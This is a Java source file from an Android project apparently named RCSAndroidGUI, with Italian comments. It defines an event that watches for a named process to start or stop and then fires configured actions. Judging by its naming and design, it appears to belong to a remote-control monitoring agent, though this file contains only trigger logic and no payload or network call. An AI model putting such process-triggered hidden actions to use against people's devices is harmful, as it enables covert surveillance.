package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.test.IsolatedContext;
import android.util.Log;

import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerProcess;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.WChar;
import com.ht.RCSAndroidGUI.ProcessInfo;
import com.ht.RCSAndroidGUI.ProcessStatus;
import com.ht.RCSAndroidGUI.RunningProcesses;

public class EventProcess extends EventBase implements Observer<ProcessInfo> {
	/** The Constant TAG. */
	private static final String TAG = "EventProcess";

	private int actionOnEnter, actionOnExit;
	private int type;
	private boolean active = false;
	private String name;

	@Override
	public void begin() {
		ListenerProcess.self().attach(this);
	}

	@Override
	public void end() {
		ListenerProcess.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();
		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();
			type = databuffer.readInt();

			// Estraiamo il nome del processo
			byte[] procName = new byte[databuffer.readInt()];
			databuffer.read(procName);

			name = WChar.getString(procName, true);
		} catch (final IOException e) {
			Log.d("QZ", TAG + " Error: params FAILED");

			return false;
		}

		return true;
	}

	@Override
	public void go() {

	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(ProcessInfo process) {
		String processName = process.processInfo.processName;
		if (!processName.equals(name)) {
			return 0;
		}
		switch (type) {
			case 0: // Process
				if (process.status == ProcessStatus.START && active == false) {
					active = true;
					onEnter();
				} else if (process.status == ProcessStatus.STOP && active == true) {
					active = false;
					onExit();
				}

				break;

			case 1: // Window
			default:
				break;
		}

		return 0;
	}

	public void onEnter() {
		Log.d("QZ", TAG + " (onEnter): triggering " + actionOnEnter + " " + name);
		trigger(actionOnEnter);
	}

	public void onExit() {
		Log.d("QZ", TAG + " (onExit): triggering " + actionOnExit + " " + name);
		trigger(actionOnExit);
	}
}